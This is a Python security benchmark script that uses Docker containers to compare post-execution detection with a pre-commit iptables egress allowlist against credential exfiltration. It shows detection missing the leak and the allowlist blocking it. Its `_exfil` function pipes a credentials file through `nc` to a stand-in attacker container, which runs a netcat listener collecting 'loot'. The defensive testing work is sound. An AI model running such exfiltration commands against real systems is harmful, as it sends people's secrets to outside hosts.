"""SPEC-22 RA14a: prevent-vs-detect for exfiltration, resolved on a real network (review item #6).

The review item #6: "Resolve prevent-vs-detect for exfiltration explicitly." Its sharpest
(severity 2d): the oracle's central mechanism diffs the protected region AFTER execution, so for
exfiltration (read a secret, send it off-host) it detects too late, and the harm is footprintless:
the read mutates nothing, so even a perfect content-diff of the protected region sees no change.
demonstrate this on a real Docker network and resolve it.

Setup: a victim container holds a credential; an attacker container listens off-host (not on the
egress allowlist); a metrics container listens and IS allowlisted (the legitimate egress). The
harmful
action reads the credential and sends it to the attacker; the legitimate action sends a metric
to the
allowlisted sink.

Three arms, run for real:
  - none: the send runs; the attacker receives the credential (harm).
  - detect (the oracle's default, post-commit region content-diff): the send runs, then we diff the
    protected region. It is BYTE-IDENTICAL (the read left no footprint), so the detector reports
    "clean", a FALSE NEGATIVE, while the credential has already left the host. Detection is both
    too late and blind here.
  - prevent (pre-commit egress gate): an egress allowlist (real iptables OUTPUT policy) is enforced
    before the send commits. The send to the non-allowlisted attacker is dropped; the legit send
    to the allowlisted metrics sink still succeeds. No harm, no utility loss.

The resolution is CU27 reversibility routing, forced: a network send is irreversible, so it must be
verified BEFORE commit, not detected after. The honest edge (printed and in RESULTS): the pre-commit
egress target is an allowlist, which carries the same coverage burden as any target -- arbitrary
covert channels (DNS, ICMP, timing) are not covered by a port/host allowlist, exactly the RA4
honest-edge generalized to the network. Real Docker; reproduce: python bench/ra14/exfil.py.
"""

from __future__ import annotations

import subprocess
import time

IMAGE = "verisim-ra14:latest"
NET = "ra14net"
SECRET_DIR = "/srv/app"
SECRET = "/srv/app/credentials.env"
SECRET_VAL = "DB_PASSWORD=hunter2-prod"
PORT = 9000


def _sh(container: str, cmd: str) -> tuple[int, str]:
    p = subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                       capture_output=True, text=True, check=False)
    return p.returncode, (p.stdout + p.stderr).strip()


def _rm(*names: str) -> None:
    for n in names:
        subprocess.run(["docker", "rm", "-f", n], capture_output=True, check=False)


def _run(name: str, net_admin: bool = False) -> None:
    cmd = ["docker", "run", "-d", "--name", name, "--network", NET]
    if net_admin:
        cmd += ["--cap-add", "NET_ADMIN"]
    cmd += [IMAGE]
    subprocess.run(cmd, capture_output=True, check=True)


def _listener(name: str) -> None:
    # accept one connection, append what arrives to /loot.txt, then keep accepting
    _sh(name, f"touch /loot.txt; (while true; do nc -l -p {PORT} >> /loot.txt; done) &")


def _region_hash(container: str) -> str:
    return _sh(container, f"find {SECRET_DIR} -type f -exec cat {{}} + | sha256sum")[1].split()[0]


def _received(container: str) -> str:
    return _sh(container, "cat /loot.txt 2>/dev/null")[1]


def setup() -> None:
    subprocess.run(["docker", "network", "create", NET], capture_output=True, check=False)
    _rm("ra14_atk", "ra14_metrics", "ra14_vic")
    _run("ra14_atk")
    _run("ra14_metrics")
    _run("ra14_vic", net_admin=True)
    _listener("ra14_atk")
    _listener("ra14_metrics")
    _sh("ra14_vic", f"mkdir -p {SECRET_DIR}; printf '%s\\n' '{SECRET_VAL}' > {SECRET}")
    time.sleep(1)


def _exfil(container: str) -> None:
    _sh(container, f"cat {SECRET} | nc -w 3 ra14_atk {PORT}")


def _legit_metric(container: str) -> None:
    _sh(container, f"echo 'cpu=0.42' | nc -w 3 ra14_metrics {PORT}")


def _apply_egress_allowlist(container: str) -> None:
    # the pre-commit egress gate, as a real network policy: allow loopback + the allowlisted metrics
    # host, drop everything else. The attacker host is not on the allowlist.
    metrics_ip = _sh(container, "getent hosts ra14_metrics | awk '{print $1}'")[1].strip()
    _sh(container, "iptables -A OUTPUT -o lo -j ACCEPT")
    _sh(container, f"iptables -A OUTPUT -d {metrics_ip} -j ACCEPT")
    _sh(container, "iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT")
    _sh(container, f"iptables -A OUTPUT -p tcp --dport {PORT} -j DROP")


def run_arm(arm: str) -> dict[str, object]:
    setup()
    before = _region_hash("ra14_vic")
    if arm == "prevent":
        _apply_egress_allowlist("ra14_vic")  # the gate, enforced BEFORE the send commits
    _exfil("ra14_vic")          # the harmful send
    _legit_metric("ra14_vic")   # the legitimate send
    time.sleep(2)
    after = _region_hash("ra14_vic")
    attacker_got = SECRET_VAL.split("=")[1] in _received("ra14_atk")
    metrics_got = "cpu=0.42" in _received("ra14_metrics")
    region_unchanged = before == after
    # the post-commit content-diff detector's verdict: harm iff the protected region changed
    detector_says_harm = not region_unchanged
    _rm("ra14_atk", "ra14_metrics", "ra14_vic")
    return {"arm": arm, "attacker_got_secret": attacker_got, "metrics_got_data": metrics_got,
            "region_unchanged": region_unchanged, "detector_says_harm": detector_says_harm}


def main() -> int:
    print("\nRA14a prevent-vs-detect for exfiltration: a real credential, a real off-host send")
    print(f"  Victim holds {SECRET}; attacker listens off-host (not allowlisted); metrics is")
    print("  allowlisted (the legitimate egress). 'harm' = the attacker received the credential.\n")
    cols = f"  {'arm':9s} | {'attacker got secret':>19s} | {'region unchanged':>16s} | " \
           f"{'detector verdict':>16s} | {'metrics ok':>10s}"
    print(cols)
    rows = []
    for arm in ("none", "detect", "prevent"):
        r = run_arm(arm)
        rows.append(r)
        verdict = "HARM" if r["detector_says_harm"] else "clean"
        print(f"  {arm:9s} | {r['attacker_got_secret']!s:>19s} | {r['region_unchanged']!s:>16s} | "
              f"{verdict:>16s} | {r['metrics_got_data']!s:>10s}")

    detect = next(r for r in rows if r["arm"] == "detect")
    prevent = next(r for r in rows if r["arm"] == "prevent")
    print("\n  Read-off:")
    dv = "HARM" if detect["detector_says_harm"] else "clean"
    print("  - The exfiltration leaves the protected region BYTE-IDENTICAL (the read mutates")
    print(f"    nothing), so the post-commit detector reports '{dv}' while the attacker")
    got = detect["attacker_got_secret"]
    print(f"    holds the secret: a FALSE NEGATIVE (attacker_got_secret={got}).")
    print("    Detection is too late and footprintless.")
    print(f"  - The pre-commit egress gate prevents it (attacker_got_secret="
          f"{prevent['attacker_got_secret']}) while the legitimate allowlisted send still works")
    print(f"    (metrics_got_data={prevent['metrics_got_data']}): safe and useful.")
    print("  - The resolution is CU27, forced: a network send is irreversible, so it must be")
    print("    verified BEFORE commit, not detected after. Honest edge: the egress allowlist does")
    print("    not cover covert channels (DNS/ICMP/timing) -- RA4's coverage edge, on the network.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
